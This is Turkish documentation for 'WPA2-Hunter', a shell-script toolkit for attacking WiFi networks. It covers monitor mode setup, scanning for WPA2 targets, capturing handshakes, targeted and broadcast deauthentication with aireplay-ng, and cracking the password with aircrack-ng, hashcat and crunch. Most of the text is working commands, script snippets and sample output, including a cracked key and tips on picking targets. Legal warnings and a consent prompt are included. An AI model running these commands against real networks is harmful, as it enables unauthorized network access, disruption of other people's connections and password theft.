# 📖 WPA2-Hunter Script Dokümantasyonu

Bu belge, WPA2-Hunter projesindeki tüm scriptlerin detaylı açıklamasını içerir.

---

## 📋 İçindekiler

1. [00-cleanup.sh](#00-cleanupsh---sistem-temizliği)
2. [01-setup-monitor-mode.sh](#01-setup-monitor-modesh---monitor-mode-kurulumu)
3. [02-scan-networks.sh](#02-scan-networkssh---ağ-tarama)
4. [03-capture-handshake.sh](#03-capture-handshakesh---handshake-yakalama)
5. [04-deauth-attack.sh](#04-deauth-attacksh---deauthentication-saldırısı)
6. [05-crack-password.sh](#05-crack-passwordsh---parola-kırma)

---

## 🔄 Genel İş Akışı

```
┌──────────────────┐
│ 00-cleanup.sh    │  → Sistemi temizle/sıfırla
└────────┬─────────┘
         ▼
┌──────────────────┐
│ 01-setup-monitor │  → WiFi'ı monitor moduna al
└────────┬─────────┘
         ▼
┌──────────────────┐
│ 02-scan-networks │  → Çevredeki ağları tara
└────────┬─────────┘
         ▼
┌──────────────────┐
│ 03-capture-      │  → Hedef ağdan handshake yakala
│    handshake     │
└────────┬─────────┘
         │
         ├──────────────────────┐
         │                      ▼
         │              ┌──────────────────┐
         │              │ 04-deauth-attack │  → İstemciyi düşür (opsiyonel)
         │              └────────┬─────────┘
         │                       │
         ◄───────────────────────┘
         ▼
┌──────────────────┐
│ 05-crack-        │  → Parola kır
│    password      │
└──────────────────┘
```

---

## 00-cleanup.sh - Sistem Temizliği

**Amaç:** Tüm WPA2-Hunter işlemlerini durdurur ve sistemi sıfırlar.

### Gereksinimler
- Root yetkisi (`sudo`)
- aircrack-ng suite kurulu olmalı

### İşlem Adımları

| Adım | Komut | Açıklama |
|------|-------|----------|
| 1 | `pkill -9 airodump-ng` | Ağ tarama sürecini zorla sonlandır |
| 2 | `pkill -9 aireplay-ng` | Deauth saldırı sürecini sonlandır |
| 3 | `pkill -9 aircrack-ng` | Şifre kırma sürecini sonlandır |
| 4 | `airmon-ng stop wlan0mon` | Monitor mode'u kapat |
| 5 | `systemctl restart NetworkManager` | Ağ servisini yeniden başlat |
| 6 | `rm -f /tmp/wpa2hunter_*` | Geçici dosyaları temizle |

### Kod Parçaları

#### Root Kontrolü
```bash
if [ "$EUID" -ne 0 ]; then
    echo "[!] Bu script root yetkileri gerektirir!"
    exit 1
fi
```
- `$EUID`: Effective User ID (root için 0)
- Root değilse hata verip çıkar

#### Process Sonlandırma
```bash
pkill -9 airodump-ng 2>/dev/null || true
```
- `pkill -9`: SIGKILL sinyali ile zorla sonlandır
- `2>/dev/null`: Hata mesajlarını gizle
- `|| true`: Process yoksa bile devam et

#### Geçici Dosya Temizliği
```bash
rm -f /tmp/wpa2hunter_*.conf    # Konfigürasyon dosyaları
rm -f /tmp/wpa2hunter_scan*.csv # Tarama sonuçları
rm -f /tmp/wpa2hunter_scan*.cap # Yakalama dosyaları
```

### Kullanım
```bash
sudo ./00-cleanup.sh
```

---

## 01-setup-monitor-mode.sh - Monitor Mode Kurulumu

**Amaç:** WiFi adaptörünü normal moddan monitor moduna geçirir.

### Monitor Mode Nedir?
Normal modda WiFi kartı sadece kendisine gönderilen paketleri alır. Monitor modda ise havadaki **tüm** WiFi trafiğini dinleyebilir.

### Gereksinimler
- Root yetkisi
- Uyumlu WiFi adaptörü
- aircrack-ng suite

### İşlem Adımları

| Adım | Komut | Açıklama |
|------|-------|----------|
| 1 | `iwconfig` | Mevcut WiFi interface'lerini listele |
| 2 | Kullanıcı Input | Interface adını sor (örn: wlan0) |
| 3 | `airmon-ng check kill` | Engelleyici servisleri durdur |
| 4 | `airmon-ng start $INTERFACE` | Monitor mode'u aktifleştir |
| 5 | Doğrulama | Mode:Monitor olduğunu kontrol et |
| 6 | Kaydet | Interface adını config'e yaz |

### Kod Parçaları

#### WiFi Interface Tespiti
```bash
iwconfig 2>/dev/null | grep -v "no wireless" | grep "IEEE 802.11"
```
- `iwconfig`: Kablosuz interface'leri gösterir
- `grep "IEEE 802.11"`: Sadece WiFi destekleyenleri filtrele

#### Engelleyici Servisleri Durdurma
```bash
airmon-ng check kill
```
Bu komut şu servisleri durdurur:
- NetworkManager
- wpa_supplicant
- dhclient

#### Monitor Mode Aktifleştirme
```bash
airmon-ng start "$INTERFACE"
```
- `wlan0` → `wlan0mon` olarak yeniden adlandırılır

#### Mode Doğrulama
```bash
MODE=$(iwconfig "$MON_INTERFACE" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
if [ "$MODE" = "Monitor" ]; then
    echo "✅ Başarılı!"
fi
```

#### Config Kaydetme
```bash
echo "$MON_INTERFACE" > /tmp/wpa2hunter_interface.conf
```
- Sonraki scriptler bu dosyadan interface adını okur

### Kullanım
```bash
sudo ./01-setup-monitor-mode.sh
```

### Çıktı Örneği
```
[*] WiFi interface'leri tespit ediliyor...
wlan0     IEEE 802.11  Mode:Managed

[?] WiFi interface adını girin (örn: wlan0): wlan0
[*] Engelleyici servisler durduruluyor...
[*] Monitor mode etkinleştiriliyor...

✅ Başarılı! Monitor mode aktif
Monitor Interface: wlan0mon
```

---

## 02-scan-networks.sh - Ağ Tarama

**Amaç:** Çevredeki WPA2 şifreli WiFi ağlarını tarar ve hedef belirleme için bilgi toplar.

### Gereksinimler
- Monitor mode aktif (`01-setup-monitor-mode.sh` çalıştırılmış olmalı)
- Root yetkisi

### Toplanan Bilgiler

| Alan | Açıklama |
|------|----------|
| **BSSID** | Access Point'in MAC adresi |
| **ESSID** | Ağ adı (SSID) |
| **Channel** | WiFi kanalı (1-14) |
| **Power** | Sinyal gücü (dBm, 0'a yakın = güçlü) |
| **Encryption** | Şifreleme türü (WPA2/WPA/WEP) |

### İşlem Adımları

| Adım | Açıklama |
|------|----------|
| 1 | Kaydedilmiş monitor interface'i oku |
| 2 | Monitor mode kontrolü yap |
| 3 | 30 saniye boyunca ağ tara |
| 4 | CSV çıktısından WPA2 ağları filtrele |
| 5 | Sonuçları formatla ve göster |
| 6 | Geçici dosyaları temizle |

### Kod Parçaları

#### Kaydedilmiş Interface Okuma
```bash
if [ -f /tmp/wpa2hunter_interface.conf ]; then
    MON_INTERFACE=$(cat /tmp/wpa2hunter_interface.conf)
fi
```

#### Monitor Mode Kontrolü
```bash
if ! iwconfig "$MON_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "[!] Hata: $MON_INTERFACE monitor modda değil!"
    exit 1
fi
```

#### Ağ Tarama (Timeout ile)
```bash
timeout 30 airodump-ng "$MON_INTERFACE" -w /tmp/wpa2hunter_scan --output-format csv 2>/dev/null &
SCAN_PID=$!
```
- `timeout 30`: Maksimum 30 saniye çalışır
- `-w`: Çıktı dosya prefixi
- `--output-format csv`: CSV formatında kaydet
- `&`: Arka planda çalıştır

#### Progress Göstergesi
```bash
for i in {1..30}; do
    if ! kill -0 $SCAN_PID 2>/dev/null; then
        break
    fi
    echo -n "."
    sleep 1
done
```

#### WPA2 Filtreleme
```bash
grep -i "WPA2" "${TEMP_FILE}" | while IFS=',' read -r bssid first_seen last_seen channel ...
```
- Sadece WPA2 içeren satırları al
- CSV alanlarını değişkenlere ata

### Kullanım
```bash
sudo ./02-scan-networks.sh
```

### Çıktı Örneği
```
======================================
   Tespit Edilen WPA2 Ağları
======================================

BSSID: AA:BB:CC:DD:EE:FF
ESSID: HedefAg
Channel: 6
Power: -45 dBm
Encryption: WPA2 / CCMP / PSK
---
```

### Hedef Seçim Kriterleri
- **PWR < -70**: Yakın ve güçlü sinyal
- **#Data > 0**: Aktif trafik var
- **ENC: WPA2**: Hedeflediğimiz şifreleme

---

## 03-capture-handshake.sh - Handshake Yakalama

**Amaç:** Hedef ağdan WPA2 4-Way Handshake paketlerini yakalar.

### 4-Way Handshake Nedir?
Bir istemci WiFi ağına bağlandığında, AP ile 4 mesajlık bir anahtar değişimi yapar. Bu handshake yakalanırsa, şifre offline olarak kırılabilir.

```
┌──────────┐                    ┌──────────┐
│  Client  │                    │    AP    │
└────┬─────┘                    └────┬─────┘
     │                               │
     │  1. ANonce                    │
     │◄──────────────────────────────│
     │                               │
     │  2. SNonce + MIC              │
     │──────────────────────────────►│
     │                               │
     │  3. GTK + MIC                 │
     │◄──────────────────────────────│
     │                               │
     │  4. ACK                       │
     │──────────────────────────────►│
     │                               │
```

### Gereksinimler
- Monitor mode aktif
- Hedef ağın BSSID ve kanalı (02-scan'den)
- Hedef ağa bağlı aktif bir istemci

### İşlem Adımları

| Adım | Açıklama |
|------|----------|
| 1 | Monitor interface kontrolü |
| 2 | Hedef BSSID ve kanal bilgisi al |
| 3 | Çıktı dosya adı belirle |
| 4 | Hedef bilgilerini config'e kaydet |
| 5 | airodump-ng ile paket yakalama başlat |
| 6 | Handshake doğrulaması yap |

### Kod Parçaları

#### Hedef Bilgilerini Kaydetme
```bash
echo "$TARGET_BSSID" > /tmp/wpa2hunter_target_bssid.conf
echo "$TARGET_CHANNEL" > /tmp/wpa2hunter_target_channel.conf
```

#### Handshake Yakalama
```bash
airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$OUTPUT_NAME" "$MON_INTERFACE"
```
- `-c`: Belirli kanala odaklan
- `--bssid`: Belirli AP'ye odaklan
- `-w`: Çıktı dosya adı

#### Handshake Doğrulama
```bash
if aircrack-ng "${OUTPUT_NAME}-01.cap" 2>&1 | grep -q "1 handshake"; then
    echo "✅ BAŞARILI! Handshake yakalandı!"
fi
```

### Kullanım
```bash
sudo ./03-capture-handshake.sh
```

### Handshake Yakalama İpuçları
1. **Aktif İstemci Gerekli**: Hedef ağa bağlı cihaz olmalı
2. **Bağlantı Yenileme**: İstemci yeniden bağlanmalı
3. **Deauth Saldırısı**: İstemciyi düşürüp yeniden bağlanmaya zorla

### Çıktı Dosyaları
```
captures/
├── capture-01.cap     # Ana yakalama dosyası
├── capture-01.csv     # AP ve istemci listesi
├── capture-01.kismet.csv
└── capture-01.kismet.netxml
```

---

## 04-deauth-attack.sh - Deauthentication Saldırısı

**Amaç:** Hedef ağdaki istemcileri geçici olarak düşürerek handshake yakalamayı tetikler.

### Deauth Saldırısı Nasıl Çalışır?

```
┌──────────┐     Deauth Paketleri      ┌──────────┐
│ Saldırgan│ ────────────────────────► │ İstemci  │
└──────────┘  (AP gibi davranır)       └────┬─────┘
                                            │
                                            ▼
                                    ┌──────────────┐
                                    │ Bağlantı     │
                                    │ Kopuyor!     │
                                    └──────┬───────┘
                                           │
                                           ▼
                                    ┌──────────────┐
                                    │ Yeniden      │
                                    │ Bağlanma     │
                                    │ (Handshake!) │
                                    └──────────────┘
```

### ⚠️ Yasal Uyarı
> **Bu saldırı SADECE:**
> - Kendi ağınızda
> - Yazılı izniniz olan ağlarda
> 
> **kullanılmalıdır. İzinsiz kullanım YASA DIŞIDIR!**

### Saldırı Tipleri

| Tip | Açıklama | Komut |
|-----|----------|-------|
| **Hedefli** | Belirli bir istemciyi düşür | `-c CLIENT_MAC` |
| **Broadcast** | Tüm istemcileri düşür | Sadece `-a BSSID` |

### İşlem Adımları

| Adım | Açıklama |
|------|----------|
| 1 | Root ve monitor mode kontrolü |
| 2 | Yasal uyarı onayı al ("EVET" yazılmalı) |
| 3 | Kaydedilmiş hedef BSSID kontrol et |
| 4 | Saldırı tipi seç (hedefli/broadcast) |
| 5 | Deauth paketleri gönder |

### Kod Parçaları

#### Yasal Onay Kontrolü
```bash
read -p "[?] Yasal ve etik sorumluluğu kabul ediyor musunuz? (EVET/hayir): " CONFIRM
if [ "$CONFIRM" != "EVET" ]; then
    echo "[!] İşlem iptal edildi."
    exit 0
fi
```
- Tam olarak "EVET" yazılmalı (küçük harf kabul edilmez)

#### Hedefli Saldırı
```bash
aireplay-ng --deauth 10 -a $TARGET_BSSID -c $CLIENT_MAC "$MON_INTERFACE"
```
- `--deauth 10`: 10 adet deauth paketi gönder
- `-a`: Access Point (AP) MAC adresi
- `-c`: İstemci (Client) MAC adresi

#### Broadcast Saldırı
```bash
aireplay-ng --deauth $DEAUTH_COUNT -a $TARGET_BSSID "$MON_INTERFACE"
```
- `-c` olmadan tüm istemcilere gönderilir

### Kullanım
```bash
# Başka terminal açık, 03-capture-handshake çalışırken:
sudo ./04-deauth-attack.sh
```

### Etkili Kullanım İpuçları
1. **Paralel Çalıştırma**: 03-capture-handshake çalışırken bu scripti çalıştır
2. **Tekrar Dene**: İlk seferde yakalanamazsa tekrarla
3. **Paket Sayısı**: 5-10 paket genellikle yeterli
4. **İstemci MAC**: 02-scan çıktısından STATION sütunu

---

## 05-crack-password.sh - Parola Kırma

**Amaç:** Yakalanan handshake dosyasını kullanarak WPA2 parolasını kırar.

### Kırma Yöntemleri

| Yöntem | Araç | Hız | Açıklama |
|--------|------|-----|----------|
| **Dictionary** | Aircrack-ng | ~1,000 key/s | Wordlist'teki kelimeleri dener |
| **Dictionary** | Hashcat | ~100,000+ key/s | GPU ile hızlandırılmış |
| **Brute Force** | Crunch + Aircrack | Değişken | Tüm kombinasyonları dener |

### İşlem Adımları

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  .cap Dosyası   │────►│  Wordlist       │────►│ Parola Bulundu! │
│  (Handshake)    │     │  (rockyou.txt)  │     │ veya Bulunamadı │
└─────────────────┘     └─────────────────┘     └─────────────────┘
```

### Wordlist Seçenekleri

| Seçenek | Dosya | Boyut | Kullanım |
|---------|-------|-------|----------|
| **1** | rockyou.txt | ~14M parola | Yaygın parolalar |
| **2** | Özel dosya | Değişken | Kendi wordlist'iniz |
| **3** | Crunch | Dinamik | Anlık oluştur |

### Kod Parçaları

#### Handshake Doğrulama
```bash
if ! aircrack-ng "$CAP_FILE" 2>&1 | grep -q "1 handshake"; then
    echo "[!] UYARI: Handshake bulunamadı veya geçersiz!"
fi
```

#### Rockyou.txt Hazırlama
```bash
ROCKYOU_PATH="/usr/share/wordlists/rockyou.txt"
if [ ! -f "$ROCKYOU_PATH" ]; then
    if [ -f "${ROCKYOU_PATH}.gz" ]; then
        gunzip "${ROCKYOU_PATH}.gz"  # Sıkıştırmayı aç
    fi
fi
```

#### Crunch ile Wordlist Oluşturma
```bash
crunch "$MIN_LEN" "$MAX_LEN" "$CHARSET" -o "$WORDLIST"
```
Örnek:
- `crunch 8 8 0123456789`: 8 haneli tüm sayısal kombinasyonlar
- Bu 10^8 = 100,000,000 olasılık demek!

#### Aircrack-ng ile Kırma
```bash
aircrack-ng -w "$WORDLIST" -b "$TARGET_BSSID" "$CAP_FILE"
```
- `-w`: Wordlist dosyası
- `-b`: Hedef BSSID
- CPU ile çalışır (~1,000 key/s)

#### Hashcat ile Kırma (Hızlı)
```bash
# 1. cap → hashcat formatına dönüştür
hcxpcapngtool -o "$HASH_FILE" "$CAP_FILE"

# 2. Hashcat çalıştır
hashcat -m 22000 -a 0 "$HASH_FILE" "$WORDLIST"

# 3. Sonucu göster
hashcat -m 22000 "$HASH_FILE" --show
```
- `-m 22000`: WPA-PBKDF2-PMKID+EAPOL mode
- `-a 0`: Dictionary attack
- GPU ile çalışır (~100,000+ key/s)

### Kullanım
```bash
sudo ./05-crack-password.sh
```

### Örnek Çalışma

```
[?] .cap dosya yolu: ../captures/capture-01.cap
[*] Handshake doğrulanıyor...

📚 Wordlist Seçimi
---
  1) Rockyou.txt (~14M parola - önerilen)
  2) Özel wordlist dosyası
  3) Crunch ile anlık oluştur

[?] Seçiminiz (1/2/3): 1

🔓 Kırma Yöntemi:
---
  1) Aircrack-ng (CPU - ~1,000 key/s)
  2) Hashcat (GPU - ~100,000+ key/s) [Önerilen]

[?] Seçiminiz (1/2): 2

[*] Hashcat ile kırma başlatıldı...

✅ KEY FOUND! [ password123 ]
```

### Performans Karşılaştırması

| Yöntem | 14M Wordlist Süresi |
|--------|---------------------|
| Aircrack-ng (CPU) | ~4 saat |
| Hashcat (GPU) | ~2-3 dakika |

---

## 🔧 Ortak Özellikler

### Tüm Scriptlerde Bulunan Kontroller

```bash
# 1. Root Yetki Kontrolü
if [ "$EUID" -ne 0 ]; then
    echo "Root yetkileri gerektirir!"
    exit 1
fi

# 2. set -e
set -e  # Herhangi bir hata durumunda scripti durdur

# 3. Geçici Dosyalar
/tmp/wpa2hunter_interface.conf      # Monitor interface adı
/tmp/wpa2hunter_target_bssid.conf   # Hedef AP MAC
/tmp/wpa2hunter_target_channel.conf # Hedef kanal
```

### Renk ve Emoji Kullanımı

| Sembol | Anlam |
|--------|-------|
| ✅ | Başarı |
| ❌ | Hata |
| ⚠️ | Uyarı |
| 📡 | Ağ/Tarama |
| 🎯 | Hedef |
| 💡 | İpucu |
| ▶️ | Sonraki adım |
| 🔓 | Parola/Kırma |
| 📚 | Wordlist |

---

## 📁 Dizin Yapısı

```
WPA2-Hunter/
├── scripts/
│   ├── 00-cleanup.sh
│   ├── 01-setup-monitor-mode.sh
│   ├── 02-scan-networks.sh
│   ├── 03-capture-handshake.sh
│   ├── 04-deauth-attack.sh
│   └── 05-crack-password.sh
├── captures/          # Yakalanan handshake dosyaları
├── wordlists/         # Özel wordlist'ler
└── docs/
    └── SCRIPTS_DOCUMENTATION.md  # Bu belge
```

---

## 🛡️ Güvenlik ve Etik

> **⚠️ UYARI: Bu araçlar YALNIZCA yasal amaçlarla kullanılmalıdır!**
>
> - ✅ Kendi ağınızı test edin
> - ✅ Yazılı izin alınmış penetrasyon testleri
> - ✅ Eğitim ve araştırma amaçlı (lab ortamında)
> - ❌ İzinsiz ağlara erişim YASA DIŞIDIR
> - ❌ Başkalarının trafiğini izlemek YASA DIŞIDIR

---

*Son güncelleme: 2025-12-25*
